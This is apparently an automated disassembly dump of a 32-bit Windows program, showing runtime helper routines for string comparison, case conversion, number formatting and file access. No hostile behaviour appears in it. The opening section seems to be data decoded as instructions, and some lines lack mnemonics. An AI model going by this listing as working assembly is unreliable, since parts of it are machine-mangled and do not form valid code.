add [ esi + edx * 8 + 0x47 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ah ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ch ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dh ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh ch
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ah dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ch dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dh dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh dl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ah bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ch bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dh bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh bl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ah al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ch al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dh al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh al
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add al cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add cl cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dl cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bl cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ah cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add ch cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add dh cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add bh cl
inc [ eax ]
add [ esi + edx * 8 + 0x47 ] ah
add [ eax + 0x640000ff ] dh
salc
inc edi
add [ ecx + 0x640000ff ] dh
salc
inc edi
add [ edx + 0x640000ff ] dh
salc
inc edi
add [ ebx + 0x640000ff ] dh
salc
inc edi
add [ edi + edi * 8 - 0x299c0000 ] dh
inc edi
add [ ebp + 0x640000ff ] dh
salc
inc edi
add [ esi + 0x640000ff ] dh
salc
inc edi
add [ edi + 0x640000ff ] dh
salc
inc edi
add [ eax + 0x640000ff ] bh
salc
inc edi
add [ ecx + 0x640000ff ] bh
salc
inc edi
add [ edx + 0x640000ff ] bh
salc
inc edi
add [ ebx + 0x640000ff ] bh
salc
inc edi
add [ edi + edi * 8 - 0x299c0000 ] bh
inc edi
add [ ebp + 0x640000ff ] bh
salc
inc edi
add [ esi + 0x640000ff ] bh
salc
inc edi
add [ edi + 0x640000ff ] bh
salc
inc edi
add [ eax + 0x640000ff ] ah
salc
inc edi
add [ ecx + 0x640000ff ] ah
salc
inc edi
add [ edx + 0x640000ff ] ah
salc
inc edi
add [ ebx + 0x640000ff ] ah
salc
inc edi
add [ edi + edi * 8 - 0x299c0000 ] ah
inc edi
add [ ebp + 0x640000ff ] ah
salc
inc edi
add [ esi + 0x640000ff ] ah
salc
inc edi
add [ edi + 0x640000ff ] ah
salc
inc edi
add [ eax + 0x640000ff ] ch
salc
inc edi
add [ ecx + 0x640000ff ] ch
salc
inc edi
add [ edx + 0x640000ff ] ch
salc
inc edi
add [ ebx + 0x640000ff ] ch
salc
inc edi
add [ edi + edi * 8 - 0x74ab0000 ] ch
in al dx
xor eax eax
push ebp
push sub_406f4d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f54
retn
sub_407a5c
cmp eax 0x4700407a
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x7a ] dl
inc eax
add [ 0x2500407a ] bl
jpe r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x33e00040 ] ah
inc eax
add [ esi + edx * 2 + 0x56c00040 ] dh
inc eax
add ah dh
xor eax [ eax ]
call 0xffffffffd040bb0c
push esi
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax - 0x2f ] ah
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x3500407a ] ch
jpe r-xdata
mov eax eax
push ebx
aas
add [ eax ] al
je r-xdata
add ah ah
jpe r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
call sub_403924
pop edi
pop esi
pop ebx
retn
call sub_40bac0
push edx
popad
inc ebp
js r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407a5c3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x7a
inc eax
add [ eax + 0x7a ] bh
inc eax
add [ eax ] al
add [ eax ] al
insb
jne r-xdata
mov edx ebx
call sub_402b98
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
mov eax ebx
call sub_4026dc
mov esi eax
mov eax esi
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
sub_407b0c
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407b40
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
pop edi
pop esi
pop ebx
retn
sub_407b64
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026dc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402b98
mov eax esi
pop esi
pop ebx
retn
sub_407b84
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026fc
call ebx
pop ebx
retn
sub_407bb0
push ebx
mov ebx eax
mov eax 0xc
call sub_4026dc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407b84
pop ebx
retn
sub_407be8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041a8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404534
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407c24
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041a8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404534
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407c60
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407c90
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407cb0
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407d04
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407cb0
test eax eax
jne r-xdata
sub_407d28
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041a8
mov ebx eax
mov eax esi
call sub_4043a8
mov edx eax
mov eax edi
mov ecx ebx
call sub_403fd8
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_407d5c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041a8
mov ebx eax
mov eax esi
call sub_4043a8
mov edx eax
mov eax edi
mov ecx ebx
call sub_403fd8
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_407d90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4041a8
push eax
mov eax esi
call sub_4043a8
push eax
mov eax ebx
call sub_4041a8
push eax
mov eax ebx
call sub_4043a8
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407dc8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4041a8
push eax
mov eax esi
call sub_4043a8
push eax
mov eax ebx
call sub_4041a8
push eax
mov eax ebx
call sub_4043a8
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407e18
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407e38
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4041a8
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403ee8
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404408
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407e88
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4041a8
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4041a8
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407eec
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407f02
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407f02
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f02
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f38
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407eec
mov edx esi
pop eax
call sub_403fd8
add esp 0x10
pop esi
retn
sub_407f58
or cl cl
jne sub_407f8c
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407f8c
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407f8c
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407f8c
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408024
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407f58
mov edx esi
pop eax
call sub_403fd8
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_40804c
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407eec
mov edx esi
pop eax
call sub_403fd8
add esp 0x20
pop esi
retn
xor edx edx
sub_408074
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402bd4
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407b40
sub_4080c8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402bd4
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4080e8
mov eax [ rw-data ]
call sub_404d5c
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404d5c
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f18
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f3c
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f18
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f3c
sub_408178
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407e00
test al al
je r-xdata
sub_4081b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409878
mov edx eax
test dl dl
je r-xdata
call sub_4080e8
push ebp
mov eax [ rw-data ]
call sub_404d64
mov edx eax
mov eax [ rw-data ]
call sub_408178
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404d64
mov edx eax
mov eax [ rw-data ]
call sub_408178
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408250
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f3c
call sub_4080e8
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f3c
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f3c
jmp r-xdata
pop esi
pop ebx
retn
sub_4082a0
push cs
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sete al
add esp 0x400
pop esi
pop ebx
retn
popad
je r-xdata
inc eax
add al ch
inc edx
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] al
add al 0x0
add [ eax ] al
mov eax eax
push ebx
push esi
add esp 0xfffffc00
mov esi eax
mov ebx edx
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
call LoadStringA
mov ecx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_403fd8
cmp [ ebx + 0x4 ] 0x0
sub_4082f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404854
xor eax eax
push ebp
push sub_40835e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
call sub_403ee8
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_40546c
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408365
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404924
retn
sub_408380
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4043a8
push eax
call CreateFileA
sub_4083d8
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4043a8
push eax
call CreateFileA
pop ebx
retn
sub_408404
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408430
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_40845c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40849c
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_4043a8
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_408514
push ebx
push esi
mov esi eax
mov eax esi
call sub_4041a8
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c37c
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408544
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4041a8
mov edi eax
mov eax ebx
call sub_4043a8
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408848
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c37c
cmp al 0x2
jne r-xdata
dec edi
sub_408594
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408544
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404408
pop edi
pop esi
pop ebx
retn
sub_4085cc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_408544
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403ee8
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404408
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408614
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4043a8
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_403fd8
add esp 0x108
pop esi
pop ebx
retn
sub_408650
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404cbc
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404cbc
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408700
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408728
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_40875c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4041a8
push eax
mov eax ebx
call sub_4043a8
mov edx eax
mov eax esi
pop ecx
call sub_408728
pop esi
pop ebx
retn
sub_408780
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4043a8
mov edx eax
mov ecx edi
mov eax ebx
call sub_408728
pop edi
pop esi
pop ebx
retn
sub_4087a0
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_4087c4
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408804
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_40885c
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_4088e4
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4086c4
mov esi eax
inc esi
mov eax esi
call sub_4088c4
mov ecx esi
